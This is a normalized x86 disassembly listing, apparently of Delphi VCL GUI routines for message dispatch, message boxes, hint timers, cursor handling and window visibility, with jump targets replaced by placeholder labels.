mov edx edi
mov eax esi
call sub_46cd10
test al al
jne r-xdata
mov ecx esp
mov edx edi
mov eax [ esi + 0xdc ]
call [ esi + 0xd8 ]
cmp [ esp ] 0x0
jne r-xdata
mov edx edi
mov eax esi
call sub_46cc08
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46cc58
test al al
jne r-xdata
mov edx edi
mov eax esi
call sub_46cbe4
test al al
jne r-xdata
push edi
call TranslateMessage
push edi
call DispatchMessageA
jmp r-xdata
sub_46ce48
push ebx
add esp 0xffffffe4
mov ebx eax
mov edx esp
mov eax ebx
call sub_46cdb0
test al al
jne r-xdata
add esp 0x1c
pop ebx
retn
mov edx esp
mov eax ebx
call sub_46d718
sub_46ce6c
push ebp
mov ebp esp
push ebx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
call sub_4188b4
mov eax 0x8
call sub_4026cc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov edx eax
mov eax [ ebx + 0xa8 ]
call sub_418778
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebx
pop ebp
retn 0x8
lea edx [ ebp + 0x8 ]
push edx
push 0x0
push 0xb020
push eax
call SendMessageA
jmp r-xdata
sub_46cec8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov eax [ ebx + 0xa8 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
inc edi
xor esi esi
lea edx [ ebp + 0x8 ]
push edx
push 0x1
push 0xb020
push eax
call SendMessageA
jmp r-xdata
inc esi
dec edi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx [ eax + 0x4 ]
jne r-xdata
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4188d4
mov edx [ eax ]
cmp edx [ ebp + 0x8 ]
jne r-xdata
mov edx 0x8
call sub_4026ec
mov edx esi
mov eax [ ebx + 0xa8 ]
call sub_4187c4
jmp r-xdata
sub_46cf5c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
mov eax ebx
call [ eax - 0xc ]
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
xor eax eax
push ebp
push j_sub_403788#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
or edx 0xffffffff
mov eax ebx
mov edi [ eax ]
call [ edi + 0x2c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ esi + 0x44 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
mov edi ebx
mov eax edi
call sub_453094
mov [ esi + 0x44 ] edi
sub_46cfdc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x1
xor edx edx
push ebp
push sub_46d0ba
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax sub_463e0c
call sub_407ef4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d0c1
mov eax [ ebp - 0x4 ]
mov [ eax + 0xa5 ] 0x0
retn
mov edx [ rw-data ]
mov edx [ edx ]
sub edx 0x3
je r-xdata
mov dl 0x2
call sub_46762c
sub edx 0x4
jne r-xdata
xor eax eax
push ebp
push sub_46d081
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46ce48
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x44 ]
cmp [ eax + 0x22b ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x5b ] 0x0
je r-xdata
mov [ eax + 0x22b ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x9c ] 0x0
je r-xdata
mov dl 0x1
call sub_466534
mov eax [ ebp - 0x4 ]
call sub_46c9ac
jmp r-xdata
sub_46d0dc
push ebx
push esi
mov esi edx
mov ebx eax
call GetCapture
test eax eax
je r-xdata
call sub_40275c
mov edx [ r-xdata ]
call sub_403434
test al al
je r-xdata
push 0x0
push 0x0
push 0x1f
call GetCapture
push eax
call SendMessageA
call sub_40277c
push eax
call sub_40275c
pop edx
call sub_40b908
call sub_40275c
mov edx [ rw-data ]
call sub_403434
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0xd2 ] 0x0
je r-xdata
call sub_40275c
mov edx eax
mov eax ebx
call sub_46d2d4
pop esi
pop ebx
retn
call sub_40275c
mov ecx eax
mov edx esi
mov eax [ ebx + 0xd4 ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_46d16c
push ebp
mov ebp esp
add esp 0xffffffac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
call GetActiveWindow
mov [ ebp - 0xc ] eax
push 0x2
mov eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x14 ] eax
push 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
xor eax eax
call sub_463e94
mov [ ebp - 0x10 ] eax
call sub_463db0
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x4 ]
call sub_46c110
test al al
je r-xdata
mov [ ebp - 0x44 ] 0x28
lea eax [ ebp - 0x44 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
lea eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call GetWindowRect
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x3c ]
sub ecx edx
sar ecx 0x1
jns r-xdata
xor ecx ecx
push ebp
push sub_46d2c1
push [ fs : ecx ]
mov [ fs : ecx ] esp
push ebx
push edi
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call MessageBoxA
mov [ ebp - 0x8 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d2c8
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
je r-xdata
or ebx 0x100000
add ecx edx
push ecx
mov edx [ ebp - 0x38 ]
mov eax [ ebp - 0x40 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
mov eax [ ebp - 0x10 ]
call sub_463f48
mov eax [ ebp - 0xc ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x1c ]
call sub_463db8
retn
push 0x1d
push 0x0
push 0x0
mov ecx [ ebp - 0x48 ]
mov edx [ ebp - 0x50 ]
sub ecx edx
sar ecx 0x1
jns r-xdata
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
add ecx edx
push ecx
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x54 ]
sub edx eax
sar edx 0x1
jns r-xdata
adc ecx 0x0
add edx eax
push edx
push 0x0
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
adc edx 0x0
sub_46d2d4
push ebp
mov ebp esp
add esp 0xfffffef8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x108 ] ecx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46d38f
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ esi + 0x4 ]
call sub_4040d0
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push 0x10
lea edx [ ebp - 0x108 ]
mov eax ebx
call sub_46cb98
mov eax [ ebp - 0x108 ]
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
mov edx eax
mov eax ebx
pop ecx
call sub_46d16c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d396
lea eax [ ebp - 0x108 ]
call sub_404038
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax [ ebp - 0x4 ]
call sub_408890
mov edx eax
lea eax [ ebp - 0x104 ]
call sub_402db0
lea eax [ ebp - 0x104 ]
mov edx r-xdata
call sub_402bc8
jbe r-xdata
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404300
sub_46d3ac
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] dx
mov esi eax
xor ebx ebx
mov [ esp + 0x8 ] 0x1
mov eax [ rw-data ]
mov edi [ eax + 0x68 ]
test edi edi
je r-xdata
cmp [ esi + 0xf2 ] 0x0
je r-xdata
cmp [ edi + 0x2aa ] 0x0
je r-xdata
test edi edi
je r-xdata
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_453254
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_4533bc
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46da50
test al al
je r-xdata
call sub_4530b8
mov ebp eax
mov eax edi
call sub_4530b8
mov ebp eax
mov eax esi
call sub_46da50
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_46d514
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46d56c
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46da50
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46e29c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d573
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_46d57c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_46d5d4
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46da50
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_46e29c
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d5db
lea eax [ ebp - 0x4 ]
call sub_404038
retn
sub_46d5ec
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4032a8
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_44ca14
jmp r-xdata
sub_46d63c
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_46ab44
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_4530b8
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46ab30
mov ebx eax
mov eax ebx
call sub_4533bc
test al al
je r-xdata
mov eax ebx
call sub_4530b8
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_46d6a0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_44b0f8
mov edi eax
call sub_4499f0
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_44da78
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_44da78
sub_46d718
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46d828
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46d6a0
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46b6f4
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_449958
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_46d8d8
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push sub_46d7cf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_46dc70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_46d63c
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_420da8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46d82f
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40405c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_46d838
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_46ab28
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_46ab14
movzx edx di
xor ecx ecx
call sub_44da78
inc esi
dec ebx
jne r-xdata
sub_46d874
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_46c990
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46c990
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_46d838
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_46d8d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_404444
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_40408c
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_446124
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_459818
xor eax eax
push ebp
push sub_46d95d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_4034a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_4032a8
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_46d96c
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_46d9c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_46ab28
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_46d96c
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_46ab14
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_46d96c
pop ecx
jmp r-xdata
mov eax ebx
call sub_4533bc
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_4530b8
push eax
call IsChild
test eax eax
jne r-xdata
sub_46da50
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_405934
call sub_42d330
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_46da78
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_46dabc
push sub_46b74c
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_46dc70
sub_46dae4
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406d24
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44c38c
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_44b0f8
call sub_46b72c
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_46dc70
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406d24
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44c38c
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_46dc70
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_46da78
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_44da78
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_46df08
jmp r-xdata
sub_46dbf4
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_46dabc
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_46df08
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_46dc2c
jmp r-xdata
sub_46dc2c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4533bc
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_4530b8
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_4530b8
push eax
call ShowWindow
sub_46dc70
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_46dc2c
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_46b8b4
mov eax ebx
call sub_46dabc
sub_46dca8
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_46ddea
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_426810
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407ea8
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_46ddbb
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_4268c8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ddc2
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_4026ec
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_46dc98
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_46dc98
mov [ ebp - 0x4 ] eax
sub_46ddc2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_46ddfc
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_4032a8
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031f0
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46de5c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_46def6
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46defd
lea eax [ ebp - 0x8 ]
call sub_404038
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404128
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_4253ac
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c5bc
mov ebx eax
inc ebx
sub_46df08
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_4049d0
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46e28e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_46dc70
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_46da78
jmp r-xdata
call sub_464060
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46e295
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_40405c
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404aa0
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_44b0f8
call sub_46b72c
